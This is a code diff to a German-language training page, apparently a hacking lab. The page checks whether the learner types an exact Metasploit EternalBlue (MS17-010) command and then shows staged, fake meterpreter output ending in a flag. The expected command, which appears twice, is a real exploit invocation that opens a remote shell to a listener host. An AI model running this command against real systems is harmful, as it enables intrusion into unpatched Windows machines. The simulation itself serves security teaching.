@@ -161,20 +161,34 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1
             }, 2000);
         }
 
-        function checkExploit() {
-            const input = document.getElementById("exploit-command").value.trim();
-            const console2 = document.getElementById("console-2");
-            const expectedCommand = 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1.100; set RHOST 192.168.1.20; run"';
+    function checkExploit() {
+    const input = document.getElementById("exploit-command").value.trim();
+    const console2 = document.getElementById("console-2");
+    const expectedCommand = 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1.100; set RHOST 192.168.1.20; run"';
 
-            if (input === expectedCommand) {
-                console2.innerHTML = "Starte Exploit...\n";
+    if (input === expectedCommand) {
+        console2.innerHTML = "Starte Exploit...\n";
+        setTimeout(() => {
+            console2.innerHTML += "Exploit erfolgreich. Verbindung mit dem Ziel hergestellt.\n";
+            setTimeout(() => {
+                console2.innerHTML += "\nmeterpreter > ls\n";
+                console2.innerHTML += " Directory of C:\\Users\\Victim\\Desktop\n";
+                console2.innerHTML += " flag.txt\n";
+                console2.innerHTML += " confidential.docx\n";
                 setTimeout(() => {
-                    console2.innerHTML += "Exploit erfolgreich. Verbindung mit dem Ziel hergestellt.\n";
-                }, 3000);
-            } else {
-                console2.innerHTML = "Ungültiger Befehl! Überprüfe die Syntax und versuche es erneut.";
-            }
-        }
+                    console2.innerHTML += "\nmeterpreter > cd Desktop\n";
+                    setTimeout(() => {
+                        console2.innerHTML += "meterpreter > cat flag.txt\n";
+                        console2.innerHTML += "Flag: {PATCH_THE_PATCH}\n";
+                    }, 2000);
+                }, 2000);
+            }, 2000);
+        }, 3000);
+    } else {
+        console2.innerHTML = "Ungültiger Befehl! Überprüfe die Syntax und versuche es erneut.";
+    }
+}
+
     </script>
 </body>
 </html>
